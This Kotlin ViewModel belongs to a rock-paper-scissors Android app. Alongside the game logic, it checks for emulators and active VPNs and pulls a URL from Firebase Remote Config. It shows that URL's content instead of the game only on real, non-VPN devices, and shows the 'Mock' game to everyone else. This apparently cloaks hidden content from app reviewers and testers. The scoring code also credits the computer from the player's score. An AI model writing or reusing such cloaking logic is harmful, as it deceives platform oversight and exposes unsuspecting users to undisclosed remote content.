package rock.paper.scissors.presentation

import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import dagger.hilt.android.lifecycle.HiltViewModel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import rock.paper.scissors.data.variants
import rock.paper.scissors.domain.Keeper
import rock.paper.scissors.domain.Service
import javax.inject.Inject

@HiltViewModel
class MainViewModel @Inject constructor(
    private val service: Service,
    private val keeper: Keeper
) : ViewModel() {
    private val _state = MutableStateFlow(MainState())
    val state = _state.asStateFlow()

    init {
        getFromLocal()
    }

    private fun getFromLocal() {
        if (service.checkIsEmu()) {
            game()
        } else {
            val pathUrl = keeper.getSharedUrl()
            val sharedTo = keeper.getSharedTo()
            if (pathUrl.isNullOrEmpty()) {
                getRemoteData()
            } else {
                setStatusByChecking(
                    url = pathUrl,
                    isCheckVpn = sharedTo
                )
            }
        }
    }

    private fun getRemoteData() {
        val remoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(3600)
            .build()
        remoteConfig.setConfigSettingsAsync(configSettings)
        remoteConfig.fetchAndActivate()
            .addOnCompleteListener { p0 ->
                if (p0.isSuccessful) {
                    val isCheckedVpn = remoteConfig.getBoolean("to")
                    val resultUrl = remoteConfig.getString("url")
                    keeper.setSharedUrl(url = resultUrl)
                    keeper.setSharedTo(isCheckedVpn)
                    setStatusByChecking(
                        url = resultUrl,
                        isCheckVpn = isCheckedVpn
                    )
                } else {
                    game()
                }
            }
    }


    private fun setStatusByChecking(url: String, isCheckVpn: Boolean) {
        if (isCheckVpn) {
            if (service.checkIsEmu() || url == "" || service.vpnActive()) {
                game()
            } else {
                _state.value.copy(
                    status = ApplicationStatus.Succsess(url = url)
                )
                    .updateStateUI()

            }
        } else {
            viewModelScope.launch {
                if (service.checkIsEmu() || url == "") {
                    game()
                } else {
                    _state.value.copy(
                        status = ApplicationStatus.Succsess(url = url)
                    )
                        .updateStateUI()

                }
            }
        }
    }

    private fun game() {

        _state.value.copy(
            status = ApplicationStatus.Mock
        )
            .updateStateUI()
    }

    fun click(idMen: Int, imageMen: Int) {
        viewModelScope.launch {
            _state.value.copy(
                imageMen = imageMen
            )
                .updateStateUI()
            delay(300)
            val variantComp = variants.random()
            _state.value.copy(
                imageComp = variantComp.image
            )
                .updateStateUI()
            checkWin(
                idMen = idMen,
                idComp = variantComp.id
            )
        }
    }

    private fun checkWin(
        idMen: Int,
        idComp: Int
    ) {
        if (idMen==idComp) {
            _state.value.copy(
                message = "Nothing win"
            )
                .updateStateUI()
        } else {
            if (idMen==1&&idComp==2) {
                val currentMenScore = _state.value.scoreMen
                _state.value.copy(
                    message = "You win",
                    scoreMen = currentMenScore+1
                )
                    .updateStateUI()
            }
            if (idMen==1&&idComp==3) {
                val currentCompScore = _state.value.scoreMen
                _state.value.copy(
                    message = "You lose",
                    scoreComp = currentCompScore+1
                )
                    .updateStateUI()
            }
            if (idMen==2&&idComp==3) {
                val currentMenScore = _state.value.scoreMen
                _state.value.copy(
                    message = "You win",
                    scoreMen = currentMenScore+1
                )
                    .updateStateUI()
            }
            if (idMen==2&&idComp==1) {
                val currentCompScore = _state.value.scoreMen
                _state.value.copy(
                    message = "You lose",
                    scoreComp = currentCompScore+1
                )
                    .updateStateUI()
            }
            if (idMen==3&&idComp==1) {
                val currentMenScore = _state.value.scoreMen
                _state.value.copy(
                    message = "You win",
                    scoreMen = currentMenScore+1
                )
                    .updateStateUI()
            }
            if (idMen==3&&idComp==2) {
                val currentCompScore = _state.value.scoreMen
                _state.value.copy(
                    message = "You lose",
                    scoreComp = currentCompScore+1
                )
                    .updateStateUI()
            }
        }
    }

    private fun MainState.updateStateUI() {
        _state.update {
            this
        }
    }
}